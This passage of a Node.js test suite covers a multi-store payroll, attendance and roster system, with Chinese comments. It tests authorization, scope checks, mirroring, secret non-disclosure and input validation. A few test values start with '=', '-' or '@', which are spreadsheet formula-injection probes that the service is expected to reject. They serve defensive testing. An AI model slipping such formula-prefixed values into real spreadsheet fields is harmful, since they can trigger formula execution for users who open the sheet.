      master: [{ emp_id: 'E01', name: '測試一', is_full_time: 'true', base: 30000, ot_rate: 200, hire_date: '2026-01-01', active: 'true', store: 'SSLGF' },
               { emp_id: 'P1', name: '計時一', is_full_time: 'false', wage: 200, hire_date: '2026-01-01', active: 'true', store: 'SSLGF' }],
    }, extra.pay || {}),
    self: Object.assign({ roster: [ME, { emp_id: 'P1', name: '計時一', key: 'KP', active: 'TRUE' }], requests: [REQH].concat((extra.requests || []).map(reqRow)) }, extra.self || {}),
  }, extra.make || {}));
  return m;
}
ok('出勤紀錄表 payAttendanceBuild：被擋的卡列進 invalid 不進工時；沒核定但有打卡算 pending_days；請假時數留白＝null；只有「已核准」申請的附件會列出', () => {
  const m = payCtx({ requests: [
    { id: 'r1', emp_id: 'E01', name: '測試一', kind: 'leave', date: '2026-11-05', leave_type: '病假', hours: 4, attach_id: 'F1', status: 'approved' },
    { id: 'r2', emp_id: 'E01', name: '測試一', kind: 'leave', date: '2026-11-06', leave_type: '病假', hours: 4, attach_id: 'F3', status: 'pending' },
    { id: 'r3', emp_id: 'E01', name: '測試一', kind: 'leave', date: '2026-11-07', leave_type: '病假', hours: 4, attach_id: 'F3', status: 'voided' },
  ], self: { events: [[T('2026-11-05T09:00:00'), 'E01', 'in'], [T('2026-11-05T13:00:00'), 'E01', 'out'], [T('2026-11-06T08:55:00'), 'E01', 'in', 'rejected_out_of_range'], [T('2026-11-06T09:00:00'), 'E01', 'in'], [T('2026-11-06T18:00:00'), 'E01', 'out']],
    approved: [['2026-11-05', 'E01', '測試一', '09:00-13:00', 4, '正常', '值班主管', '2026-11-05T14:00:00+08:00']],
    leave: [['2026-11-05', '測試一', '病假', 4], ['2026-11-08', '測試一', '出差', '']] } });
  const r = J(m.sb.handlePayrollAttendanceExport({ admin_key: 'ADM', store: 'SSLGF', ym: '2026-11', emp_id: 'E01' }));
  assert.strictEqual(r.ok, true); assert.strictEqual(r.employees.length, 1);
  const d = {}; r.employees[0].days.forEach((x) => { d[x.date] = x; });
  assert.strictEqual(d['2026-11-05'].approved, true); assert.deepStrictEqual(d['2026-11-05'].attach, [{ label: '病假', attach_id: 'F1' }]);
  assert.deepStrictEqual(d['2026-11-06'].invalid, [{ time: '08:55', type: 'in', status: 'rejected_out_of_range', label: '超出範圍，未入帳' }]);
  assert.strictEqual(d['2026-11-06'].approved, false); assert.deepStrictEqual(d['2026-11-06'].attach, []); assert.deepStrictEqual(d['2026-11-07'].attach, []);
  assert.deepStrictEqual(d['2026-11-08'].leave, [{ type: '出差', hours: null }]);
  assert.deepStrictEqual(r.employees[0].totals, { approved_hours: 4, leave_hours: 4, work_days: 1, pending_days: 1, miss_count: 0 });
  assert.strictEqual(m.sb.handlePayrollAttendanceExport({ admin_key: 'ADM', store: 'SSLGF', ym: '2026-13' }).error, 'bad_ym');
  assert.strictEqual(m.sb.handlePayrollAttendanceExport({ admin_key: 'MK', store: 'SSLGF', ym: '2026-11' }).error, 'unauthorized');
  assert.strictEqual(m.sb.handlePayrollAttendanceExport({ admin_key: 'ADM', store: 'ZZ', ym: '2026-11' }).error, 'no_clock');
});
ok('附件 payroll_attach_get：要管理金鑰；只認「那家店、已核准」申請上的附件；檔案不在附件資料夾拒；scope 外的店 scope_forbidden', () => {
  const cf = make().book('CFSS', { roster: [RH, toRow(RH, { emp_id: 'CF01', name: '乙一', key: 'KC', active: 'TRUE' })], events: [EH], approved: [AH], leave: [LH], managers: [MH, ['央廚主管', 'CK', 'true', '', '']],
    requests: [REQH, reqRow({ id: 'c1', emp_id: 'CF01', name: '乙一', kind: 'leave', date: '2026-11-05', leave_type: '病假', hours: 4, attach_id: 'F2', status: 'approved' })] });
  const m = payCtx({ requests: [
    { id: 'r1', emp_id: 'E01', name: '測試一', kind: 'leave', date: '2026-11-05', leave_type: '病假', hours: 4, attach_id: 'F1', status: 'approved' },
    { id: 'r2', emp_id: 'E01', name: '測試一', kind: 'leave', date: '2026-11-06', leave_type: '病假', hours: 4, attach_id: 'F3', status: 'pending' },
  ], make: { peers: { CFSS: cf }, hub: true } });   // reqAttachFile_ 在 LineHub.gs
  const H = m.C('PAYROLL_HANDLERS');
  const get = (b) => J(m.sb.handlePayrollAttachGet(b));
  assert.strictEqual(get({ admin_key: 'MK', store: 'SSLGF', attach_id: 'F1' }).error, 'unauthorized');
  assert.strictEqual(get({ admin_key: 'ADM', store: 'SSLGF', attach_id: 'F1' }).ok, true);
  assert.strictEqual(get({ admin_key: 'ADM', store: 'SSLGF', attach_id: 'F3' }).error, 'not_found');   // 還在審核中
  assert.strictEqual(get({ admin_key: 'ADM', store: 'CF', attach_id: 'F1' }).error, 'not_found');      // 拿別店的 store 讀光復的附件
  assert.strictEqual(get({ admin_key: 'ADM', store: 'CF', attach_id: 'F2' }).error, 'not_found');      // 檔案不在附件資料夾
  assert.strictEqual(get({ admin_key: 'ADM', store: 'SSLGF', attach_id: '' }).error, 'not_found');
  m.fresh();
  assert.strictEqual(J(H.payroll_attach_get({ admin_key: 'ADM', scope: ['CF'], store: 'SSLGF', attach_id: 'F1' })).error, 'scope_forbidden');
  m.fresh();
  assert.strictEqual(J(H.payroll_attach_get({ scope: ['SSLGF'], store: 'SSLGF', attach_id: 'F1' })).error, 'unauthorized');   // 帶 scope 沒金鑰：先驗金鑰再守門
});
ok('假別下拉 payroll_leave_options：別店的主管金鑰拿不到本店（反查那家店的 managers）；門市表沒接打卡回 no_clock_ss 不是 unauthorized', () => {
  const cf = make().book('CFSS', { roster: [RH], events: [EH], approved: [AH], leave: [LH], managers: [MH, ['央廚主管', 'CK', 'true', '', '']] });
  const m = payCtx({ make: { peers: { CFSS: cf } } });
  assert.strictEqual(m.sb.handlePayrollLeaveOptions({ store: 'CF', mgr_key: 'MK' }).error, 'unauthorized');
  assert.strictEqual(m.sb.handlePayrollLeaveOptions({ store: 'SSLGF', mgr_key: 'CK' }).error, 'unauthorized');
  assert.strictEqual(m.sb.handlePayrollLeaveOptions({ store: 'CF', mgr_key: 'CK' }).ok, true);
  assert.strictEqual(m.sb.handlePayrollLeaveOptions({ store: 'SSLGF', mgr_key: 'MK' }).ok, true);
  assert.strictEqual(m.sb.handlePayrollLeaveOptions({ store: 'MZTGF', mgr_key: 'MK' }).error, 'no_clock_ss');
  assert.strictEqual(m.sb.handlePayrollLeaveOptions({ store: 'SSLGF' }).error, 'unauthorized');
});
ok('補休帳 payCompMonthBook：只算核准的加班（審核中／作廢不算）；補休＝leave 分頁與申請同一天取大的；審核中的補休也算；計時 allowed=false；上月的不跨月', () => {
  const m = payCtx({ requests: [
    { id: 'o1', emp_id: 'E01', name: '測試一', kind: 'ot', date: '2026-11-05', start: '18:00', end: '22:00', hours: 4, status: 'approved' },
    { id: 'o2', emp_id: 'E01', name: '測試一', kind: 'ot', date: '2026-11-06', start: '18:00', end: '20:00', hours: 2, status: 'pending' },
    { id: 'o3', emp_id: 'E01', name: '測試一', kind: 'ot', date: '2026-11-07', start: '18:00', end: '20:00', hours: 2, status: 'voided' },
    { id: 'o4', emp_id: 'E01', name: '測試一', kind: 'ot', date: '2026-10-30', start: '18:00', end: '20:00', hours: 9, status: 'approved' },
    { id: 'l1', emp_id: 'E01', name: '測試一', kind: 'leave', date: '2026-11-10', leave_type: '補休', hours: 3, status: 'pending' },
    { id: 'l2', emp_id: 'P1', name: '計時一', kind: 'leave', date: '2026-11-10', leave_type: '補休', hours: 3, status: 'approved' },
  ], self: { leave: [['2026-11-10', '測試一', '補休', 5], ['2026-11-11', '測試一', '補休', 1]] } });
  const bk = m.sb.payCompMonthBook('2026-11');
  const e = J(bk.forEmp({ emp_id: 'E01', name: '測試一', is_full_time: 'true' }, 'SSLGF'));
  assert.strictEqual(e.ot_h, 4); assert.strictEqual(e.used_h, 6); assert.strictEqual(e.balance_h, -2); assert.strictEqual(e.allowed, true);
  const p = J(bk.forEmp({ emp_id: 'P1', name: '計時一', is_full_time: 'false' }, 'SSLGF'));
  assert.strictEqual(p.allowed, false); assert.strictEqual(p.used_h, 3);
  const neg = J(m.sb.payCompNegatives('2026-11', 'SSLGF', bk));
  assert.deepStrictEqual(neg.map((x) => x.emp_id), ['E01']);
  assert.strictEqual(m.sb.handlePayrollCompCheck({ admin_key: 'MK', ym: '2026-11' }).error, 'unauthorized');
});

/* ════════════════════════════════════════════════════════════════════════════
 * 第六節：總部鏡像 Mirror.gs
 * ════════════════════════════════════════════════════════════════════════════ */
console.log('\n━━ 第六節：總部鏡像 ━━');
/** 來源店 CF：HQ-01 測試甲（總部的人）、CF05 測試乙（央廚自己的人）；總部表自己有 HQ-02 的列 */
function mirrorCtx(prefix, opts) {
  opts = opts || {};
  const m = make(Object.assign({ now: T('2026-11-10T04:00:00'), autoDate: !!opts.autoDate,
    self: { roster: [{ emp_id: 'HQ-01', name: '測試甲', key: 'KA', active: 'TRUE' }, { emp_id: 'HQ-02', name: '測試丙', key: 'KB', active: 'TRUE' }],
            events: [[T('2026-11-09T09:00:00'), 'HQ-02', 'in'], [T('2026-11-09T18:00:00'), 'HQ-02', 'out']],
            approved: [['2026-11-09', 'HQ-02', '測試丙', '09:00-18:00', 9, '正常', '總部主管', '2026-11-09T19:00:00+08:00']],
            leave: [['2026-11-09', '測試丙', '事假', 2]] } }, opts.make || {}));
  const cf = m.book('CFSS', {
    roster: [RH, toRow(RH, { emp_id: 'HQ-01', name: '測試甲', key: 'x', active: 'TRUE' }), toRow(RH, { emp_id: 'CF05', name: '測試乙', key: 'y', active: 'TRUE' })],
    events: [EH, evRow([T('2026-11-09T08:00:00'), 'HQ-01', 'in']), evRow([T('2026-11-09T17:00:00'), 'HQ-01', 'out']), evRow([T('2026-11-09T08:00:00'), 'CF05', 'in']), evRow([T('2026-11-09T17:00:00'), 'CF05', 'out'])],
    approved: [AH, ['2026-11-09', 'HQ-01', '測試甲', '08:00-17:00', 9, '正常', '央廚主管', '2026-11-09T18:00:00+08:00'], ['2026-11-09', 'CF05', '測試乙', '08:00-17:00', 9, '正常', '央廚主管', '2026-11-09T18:00:00+08:00'],
               ['2026-11-08', '', '測試甲', '08:00-12:00', 4, '正常', '央廚主管', '2026-11-08T13:00:00+08:00']],
    leave: [LH, ['2026-11-09', '測試甲', '病假', 1], ['2026-11-09', '測試乙', '事假', 8]],
  });
  m.sb.SpreadsheetApp.openById = (id) => { if (id === 'SELF') return m.self; if (id === 'CFSS') return cf; throw new Error('沒權限'); };
  m.C('var MIRROR_SOURCES = ' + JSON.stringify([{ code: 'CF', ss_id: 'CFSS', emp_prefix: prefix }]) + ';');
  return Object.assign(m, { cf });
}
ok('鏡像：乾跑零寫入；套用只抄 HQ- 前綴的人（events／approved 含 emp_id 空白退回用姓名／leave 用姓名集合）；總部自己的列一列不動；重跑冪等（removed＝added）', () => {
  const m = mirrorCtx('HQ-');
  const sb = m.sb;
  const before = JSON.stringify([m.rows('events'), m.rows('approved'), m.rows('leave')]);
  const dry = J(sb.handleMirrorRun({ admin_key: 'ADM', apply: 'true' }));   // 字串 'true' 也只是乾跑
  assert.strictEqual(dry.apply, false); assert.deepStrictEqual(dry.sources[0].tables, { events: { removed: 0, added: 2 }, approved: { removed: 0, added: 2 }, leave: { removed: 0, added: 1 } });
  assert.strictEqual(JSON.stringify([m.rows('events'), m.rows('approved'), m.rows('leave')]), before, '乾跑寫了東西');
  assert.strictEqual(sb.handleMirrorRun({ admin_key: 'MK', apply: true }).error, 'unauthorized');
  const r1 = J(sb.handleMirrorRun({ admin_key: 'ADM', apply: true }));
  assert.strictEqual(r1.ok, true);
  const ev = m.objs('events');
  assert.deepStrictEqual(ev.map((e) => e.emp_id + ':' + (e.mirror_src || '')), ['HQ-02:', 'HQ-02:', 'HQ-01:CF', 'HQ-01:CF']);
  assert.deepStrictEqual(m.objs('approved').map((a) => a.emp_id + '|' + a.name + '|' + (a.mirror_src || '')), ['HQ-02|測試丙|', 'HQ-01|測試甲|CF', '|測試甲|CF']);
  assert.deepStrictEqual(m.objs('leave').map((l) => l['姓名'] + '|' + (l.mirror_src || '')), ['測試丙|', '測試甲|CF']);
  const r2 = J(sb.handleMirrorRun({ admin_key: 'ADM', apply: true }));
  assert.deepStrictEqual(r2.sources[0].tables, { events: { removed: 2, added: 2 }, approved: { removed: 2, added: 2 }, leave: { removed: 1, added: 1 } });
  assert.strictEqual(m.rows('events').length, 4); assert.strictEqual(m.rows('leave').length, 2);
  // 薪資端（總部）讀到的：HQ-01 11/9 核定 9H、病假 1H；測試乙的事假不會混進來。
  // emp_id 空白那筆核定（11/8 測試甲 4H）鏡像過來了，但 payCollect 以 emp_id 歸集 → 歸到 '' 不是 HQ-01（來源資料本來就缺工號，照實反映）
  const c = J(sb.payCollect('2026-11', 6, 'SSLGF', [], null));
  assert.strictEqual(c['HQ-01'].hours, 9); assert.strictEqual(c['HQ-01'].sick_h, 1); assert.strictEqual(c['HQ-01'].personal_h, 0);
  assert.strictEqual(c[''] && c[''].hours, 4);
});
/* 7. emp_prefix 沒去前後空白：' HQ-' 永遠對不到任何人 → 來源挑出 0 列、卻照樣把上次鏡像的列全刪 → 總部薪資那些人的工時／核定／請假整批消失（乾跑只會顯示 removed N added 0）。 */
ok('鏡像設定 emp_prefix 帶空白（" HQ-"）：要去空白或拒絕執行，不能把上次鏡像的列整批清掉', () => {
  const m = mirrorCtx('HQ-');
  assert.ok(m.sb.handleMirrorRun({ admin_key: 'ADM', apply: true }).ok);
  m.C('MIRROR_SOURCES[0].emp_prefix = " HQ-";');
  const r = J(m.sb.handleMirrorRun({ admin_key: 'ADM', apply: true }));
  const mirrored = m.objs('events').filter((e) => e.mirror_src === 'CF').length;
  assert.ok(!r.ok || mirrored === 2, '跑完後總部表裡 HQ-01 的鏡像列剩 ' + mirrored + ' 筆（' + JSON.stringify(r.sources && r.sources[0].tables.events) + '）');
});
ok('鏡像設定守門：空前綴擋、ss_id 佔位擋、code 重複擋、抄自己擋；來源表開不起來＝整個不寫（plan 失敗）', () => {
  const m = mirrorCtx('HQ-');
  const run = () => J(m.sb.handleMirrorRun({ admin_key: 'ADM', apply: true }));
  m.C('MIRROR_SOURCES[0].emp_prefix = "  ";'); assert.strictEqual(run().error, 'bad_mirror_config');
  m.C('MIRROR_SOURCES[0].emp_prefix = "HQ-"; MIRROR_SOURCES[0].ss_id = "PASTE_ID";'); assert.strictEqual(run().error, 'bad_mirror_config');
  m.C('MIRROR_SOURCES[0].ss_id = "SELF";'); assert.strictEqual(run().error, 'bad_mirror_config');
  m.C('MIRROR_SOURCES[0].ss_id = "NOPE";'); assert.strictEqual(run().error, 'mirror_plan_failed');
  assert.strictEqual(m.rows('events').length, 2);
  m.C('MIRROR_SOURCES = [{ code: "CF", ss_id: "CFSS", emp_prefix: "HQ-" }, { code: "CF", ss_id: "CFSS", emp_prefix: "HQ-" }];'); assert.strictEqual(run().error, 'bad_mirror_config');
});
ok('鏡像：來源的日期／時間被 Sheets 轉成日期物件也正規化成字串再寫（總部薪資照樣對得到）', () => {
  const m = mirrorCtx('HQ-', { autoDate: true });
  m.cf.sh.approved.getRange(2, 1).setValue('2026-11-09');   // 來源那格被自動轉成 Date
  m.cf.sh.leave.getRange(2, 1).setValue('2026-11-09');
  assert.ok(m.cf.sh.approved.values[1][0] instanceof m.sb.Date);
  assert.ok(m.sb.handleMirrorRun({ admin_key: 'ADM', apply: true }).ok);
  const ap = m.objs('approved').filter((a) => a.mirror_src === 'CF' && a.emp_id === 'HQ-01')[0];
  assert.strictEqual(typeof ap.date, 'string'); assert.strictEqual(ap.date, '2026-11-09');
  assert.strictEqual(J(m.sb.payCollect('2026-11', 6, 'SSLGF', [], null))['HQ-01'].sick_h, 1);
});

/* ════════════════════════════════════════════════════════════════════════════
 * 第七節：名冊服務 SvcStaff.gs（管理系統用）
 * ════════════════════════════════════════════════════════════════════════════ */
console.log('\n━━ 第七節：名冊服務（SvcStaff）━━');
const SVC = { svc_key: 'SVCKEY-abc', v: 1 };
const svcCtx = (extra) => make(Object.assign({ props: { STAFF_SVC_KEY: 'SVCKEY-abc', LINE_MAP_KEY: 'mapkey-1', LINE_MAP_KID: 'k1' },
  self: { roster: [ME, Object.assign({}, U2, { line_user_id: '' }), { emp_id: 'E03', name: '離職三', key: 'K3', active: 'FALSE', removed_at: '2026-10-01T10:00:00+08:00' }],
          events: [[T('2026-11-01T09:00:00'), 'E01', 'in'], [T('2026-11-02T09:00:00'), 'E01', 'in', 'rejected_out_of_range']] } }, extra || {}));
ok('svc 金鑰：沒設屬性一律拒；金鑰型別不是字串拒；v 給 "1" 字串拒；長度不同的金鑰也拒（固定時間比對）', () => {
  const m = svcCtx();
  const sb = m.sb;
  assert.strictEqual(sb.handleSvcRoster_({ svc_key: ['SVCKEY-abc'], v: 1 }).error, 'unauthorized');
  assert.strictEqual(sb.handleSvcRoster_({ svc_key: 'SVCKEY-ab', v: 1 }).error, 'unauthorized');
  assert.strictEqual(sb.handleSvcRoster_({ svc_key: 'SVCKEY-abc', v: '1' }).error, 'bad_version');
  assert.strictEqual(sb.handleSvcRoster_(SVC).ok, true);
  delete m.props.STAFF_SVC_KEY;
  assert.strictEqual(sb.handleSvcRoster_(SVC).error, 'unauthorized');
});
ok('svc_roster 不洩漏：回應裡沒有 key／device_id／line_user_id；line_h 是 HMAC（換金鑰就變、沒金鑰為空、沒綁為空）；最近打卡日只算入帳的卡；離職列照回但 active=false', () => {
  const m = svcCtx();
  const r = J(m.sb.handleSvcRoster_(SVC));
  const txt = JSON.stringify(r);
  ['K1', 'K2', 'K3', 'D1', 'D2', 'U1'].forEach((secret) => assert.ok(txt.indexOf('"' + secret + '"') < 0, '洩漏了 ' + secret));
  assert.deepStrictEqual(Object.keys(r.rows[0]).sort(), ['active', 'created_at', 'duty_mgr', 'emp_id', 'last_punch', 'line_bound', 'line_bound_at', 'line_h', 'line_kid', 'line_ok_at', 'name', 'removed_at', 'src_emp_id', 'src_store'].sort());
  const h1 = r.rows[0].line_h;
  assert.ok(/^[0-9a-f]{64}$/.test(h1)); assert.strictEqual(h1, crypto.createHmac('sha256', 'mapkey-1').update('U1').digest('hex'));
  assert.strictEqual(r.rows[1].line_h, ''); assert.strictEqual(r.rows[1].line_bound, false);
  assert.strictEqual(r.rows[0].last_punch, '2026-11-01');   // 11-02 那張被擋的不算
  assert.strictEqual(r.rows[2].active, false); assert.strictEqual(r.rows[2].removed_at, '2026-10-01 10:00:00');
  m.props.LINE_MAP_KEY = 'mapkey-2';
  assert.notStrictEqual(J(m.sb.handleSvcRoster_(SVC)).rows[0].line_h, h1);
  delete m.props.LINE_MAP_KEY;
  assert.strictEqual(J(m.sb.handleSvcRoster_(SVC)).rows[0].line_h, '');
});
ok('svc_add：= + - @ 開頭的姓名／created_by／src_* 拒收；21 字拒；op_id 重送回同一個 emp_id 不再加；在職同名 duplicate_name；不回 key', () => {
  const m = svcCtx();
  const sb = m.sb;
  const base = Object.assign({ op_id: 'op-1', created_by: '管理系統：小明', src_store: 'hq', src_emp_id: 'HQ-9' }, SVC);
  assert.strictEqual(sb.handleSvcAdd_(Object.assign({}, base, { name: '=新人' })).error, 'bad_input');
  assert.strictEqual(sb.handleSvcAdd_(Object.assign({}, base, { name: '新人', created_by: ' -x' })).error, 'bad_input');
  assert.strictEqual(sb.handleSvcAdd_(Object.assign({}, base, { name: '新人', src_emp_id: '@x' })).error, 'bad_input');
  assert.strictEqual(sb.handleSvcAdd_(Object.assign({}, base, { name: 'x'.repeat(21) })).error, 'bad_input');
  assert.strictEqual(sb.handleSvcAdd_(Object.assign({}, base, { name: '測試一' })).error, 'duplicate_name');
  const a = J(sb.handleSvcAdd_(Object.assign({}, base, { name: '新人' })));
  assert.deepStrictEqual(a, { ok: true, emp_id: 'E04', active: true });
  const b = J(sb.handleSvcAdd_(Object.assign({}, base, { name: '新人二' })));   // 同 op_id → 冪等
  assert.deepStrictEqual(b, { ok: true, emp_id: 'E04', active: true });
  assert.strictEqual(m.objs('roster').length, 4);
  assert.strictEqual(m.objs('roster')[3].origin_op, 'op-1');
});
ok('svc_set_active：同 op_id 重送但現況被別人改過回 conflict；by 帶公式拒；恢復在職撞同名擋；留痕寫 by', () => {
  const m = svcCtx();
  const sb = m.sb;
  const call = (b) => J(sb.handleSvcSetActive_(Object.assign({}, SVC, b)));
  assert.strictEqual(call({ emp_id: 'E01', active: false, op_id: 'op-a', by: '=x' }).error, 'bad_input');
  assert.deepStrictEqual(call({ emp_id: 'E01', active: 'false', op_id: 'op-a', by: '小明' }), { ok: true, emp_id: 'E01', active: false });
  assert.strictEqual(m.objs('roster')[0].removed_by, '小明');
  assert.ok(sb.handleMgrSetActive({ mgr_key: 'MK', emp_id: 'E01', active: true }).ok);   // 值班主管又把他恢復了
  const c = call({ emp_id: 'E01', active: false, op_id: 'op-a', by: '小明' });
  assert.strictEqual(c.error, 'conflict'); assert.strictEqual(c.active, true);
  m.self.sh.roster.appendRow(toRow(RH, { emp_id: 'E09', name: '測試一', key: 'K9', active: 'FALSE' }));
  assert.strictEqual(call({ emp_id: 'E09', active: true, op_id: 'op-b' }).error, 'duplicate_name');
  assert.strictEqual(call({ emp_id: 'E09', active: 'yes', op_id: 'op-c' }).error, 'bad_input');
});
ok('svc_set_upper：非字串／空白／重複的 emp_id 丟掉；501 個 too_many；空陣列＝刪屬性；on 只認布林', () => {
  const m = svcCtx();
  const sb = m.sb;
  const r = J(sb.handleSvcSetUpper_(Object.assign({}, SVC, { emp_ids: ['E01', ' E01 ', '', 5, null, 'E02'], dept_emp_ids: ['E03'], on: 'true' })));
  assert.deepStrictEqual(r, { ok: true, n: 2, on: false, dept_n: 1 });
  assert.strictEqual(m.props.REQ_UPPER_EMPS, '["E01","E02"]'); assert.strictEqual(m.props.REQ_DEPT_EMPS_LAST, '["E03"]');
  assert.strictEqual(sb.handleSvcSetUpper_(Object.assign({}, SVC, { emp_ids: Array.from({ length: 501 }, (_, i) => 'E' + i) })).error, 'too_many');
  assert.strictEqual(sb.handleSvcSetUpper_(Object.assign({}, SVC, { emp_ids: 'E01' })).error, 'bad_request');
  assert.ok(sb.handleSvcSetUpper_(Object.assign({}, SVC, { dept_emp_ids: [], on: true })).on);
  assert.strictEqual(m.props.REQ_DEPT_EMPS, undefined); assert.strictEqual(m.props.REQ_DEPT_EMPS_LAST, undefined);
});
ok('名單讀壞 fail-closed：REQ_HOME_EMPS 壞掉又沒有快照 → 本店主管在核定頁看不到任何人、核定回 home_review；有快照就退回快照；營運系統（allow_acting）照常', () => {
  const m = make({ props: { REQ_HOME_EMPS: '{bad json' }, self: { roster: [ME, U2], managers: [['值班主管', 'MK', 'true', '', ''], ['營運系統', 'SVC', 'true', 'TRUE', '']] } });
  const sb = m.sb;
  assert.deepStrictEqual(J(sb.reqMgrDayHome_({ mgr_key: 'MK', date: '2026-11-02' })).employees, []);
  const r = sb.reqMgrApproveHome_({ mgr_key: 'MK', emp_id: 'E01', date: '2026-11-02', periods: [PERIOD('09:00', '13:00')] });
  assert.strictEqual(r.error, 'home_review'); assert.ok(/名單讀不到/.test(r.message), r.message);
  assert.ok(sb.reqMgrApproveHome_({ mgr_key: 'SVC', acting_name: '人資', emp_id: 'E01', date: '2026-11-02', periods: [PERIOD('09:00', '13:00')] }).ok);
  m.props.REQ_HOME_EMPS_LAST = '["E02"]';   // 上一份讀成功的快照：只藏 E02
  assert.deepStrictEqual(J(sb.reqMgrDayHome_({ mgr_key: 'MK', date: '2026-11-02' })).employees.map((e) => e.emp_id), ['E01']);
  assert.strictEqual(sb.reqMgrApproveHome_({ mgr_key: 'MK', emp_id: 'E02', date: '2026-11-02', periods: [PERIOD('09:00', '13:00')] }).error, 'home_review');
});

console.log(`\n通過 ${nOk} 項；已確認問題 ${nKnownOpen} 項待修（KNOWN）${nKnownFixed ? '、' + nKnownFixed + ' 項已修好' : ''}` + (failed ? `；守門失敗 ${failed} 項` : ''));
if (failed || (process.env.ADV_STRICT === '1' && nKnownOpen)) process.exit(1);
